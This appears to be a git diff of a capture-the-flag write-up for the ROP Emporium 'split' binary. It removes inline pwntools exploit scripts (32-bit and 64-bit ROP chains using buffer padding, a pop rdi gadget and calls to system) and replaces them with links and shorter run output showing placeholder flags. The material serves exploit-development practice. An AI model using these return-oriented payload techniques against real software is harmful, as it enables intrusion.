@@ -327,69 +327,15 @@ So i'll look for the `system` address
                  ff ff
 ```
 
-Now with this read here's the exploit 
-
-```
-from pwn import *
-
-
-# Allows you to switch between local/GDB/remote from terminal
-def start(argv=[], *a, **kw):
-    if args.GDB:  # Set GDBscript below
-        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
-    elif args.REMOTE:  # ('server', 'port')
-        return remote(sys.argv[1], sys.argv[2], *a, **kw)
-    else:  # Run locally
-        return process([exe] + argv, *a, **kw)
-
-
-# Binary filename
-exe = './split'
-# This will automatically get context arch, bits, os etc
-elf = context.binary = ELF(exe, checksec=False)
-# Change logging level to help with debugging (error/warning/info/debug)
-context.log_level = 'info'
-
-# ===========================================================
-#                    EXPLOIT GOES HERE
-# ===========================================================
-
-
-# Pass in pattern_size, get back EIP/RIP offset
-offset = 44
-
-# Start program
-io = start()
-
-padding = "A" * offset 
-#usefulFunction = 0x0804860c
-system = 0x804861a
-usefulString = 0x804a030
-# Build the payload
-payload = flat([
-    padding,
-    system,
-    usefulString
-])
-
-# Send the payload
-io.sendlineafter(b'>', payload)
-
-io.interactive()
-```
+Now with this, here's the exploit [Exploit](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/ropemporium/split/exploit32.py)
 
 Running it we get the flag
 
 ```
-└─$ python2 exploit.py
-[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
-[+] Starting local process './split': pid 144269
-[*] Switching to interactive mode
- Thank you!
-ROPE{a_placeholder_32byte_flag!}
-[*] Got EOF while reading in interactive
-[*] Process './split' stopped with exit code -11 (SIGSEGV) (pid 144269)
-[*] Got EOF while sending in interactive
+└─$ python3 exploit.py 
+[+] Starting local process './split': pid 113943
+[+] ROPE{a_placeholder_32byte_flag!}
+[*] Stopped process './split' (pid 113943)
 ```
 
 But the way to solve the x64 binary is different 
@@ -420,95 +366,7 @@ Why i use pop_rdi is to pass the /bin/cat as an argument to system since we can'
 0x00000000004007c3: pop rdi; ret; 
 ```
 
-Now here's the exploit
-
-```
-from pwn import *
-
-# Binary filename
-exe = './split'
-# This will automatically get context arch, bits, os etc
-elf = context.binary = ELF(exe, checksec=False)
-# Change logging level to help with debugging (error/warning/info/debug)
-context.log_level = 'info'
-
-# ===========================================================
-#                    EXPLOIT GOES HERE
-# ===========================================================
-
-# Pass in pattern_size, get back EIP/RIP offset
-offset = 40
-
-# Start program
-io = process()
-
-padding = "A" * offset
-pop_rdi = 0x00000000004007c3
-bincat = 0x00000000000601060
-system = 0x0000000000040074b
-
-# Build the payload
-payload = flat([
-    padding,
-    pop_rdi,
-    bincat,
-    system
-])
-
-
-# Send the payload
-io.sendlineafter(b'>', payload)
-io.recvline()
-flag = io.recvline()
-success(flag)
-```
-
-On running it 
-
-```
-└─$ python2 exploit.py 
-[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
-[+] Starting local process '/home/mark/Desktop/BofLearn/Challs/RopEmperium/split/64bits/split': pid 161250
-[+] ROPE{a_placeholder_64byte_flag!}
-[*] Stopped process '/home/mark/Desktop/BofLearn/Challs/RopEmperium/split/64bits/split' (pid 161250)
-```
-
-It worked!! 
-
-Here's a script that does the same function but automated those process ( i had to debug it from movap stack allignment )
-
-```
-from pwn import *
-
-# Binary filename
-exe = './split'
-# This will automatically get context arch, bits, os etc
-elf = context.binary = ELF(exe, checksec=False)
-io = process()
-
-offset = 40
-bincat = next(elf.search(b'/bin/cat'))
-movaps = 0x000000000040053e
-
-rop = ROP(elf)
-system = rop.system(bincat)
-chain = rop.chain()
-#info("rop chain: %r", chain)
-
-payload = flat(
-    b"A" * offset,
-    movaps,
-    chain
-)
-
-#file = open("payload", "wb")
-#file.write(payload)
-
-io.sendlineafter(">", payload)
-io.recvline()
-flag = io.recvline()
-success(flag)
-```
+Now here's the exploit script [Exploit](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/ropemporium/split/exploit64.py)
 
 And we're done 
 
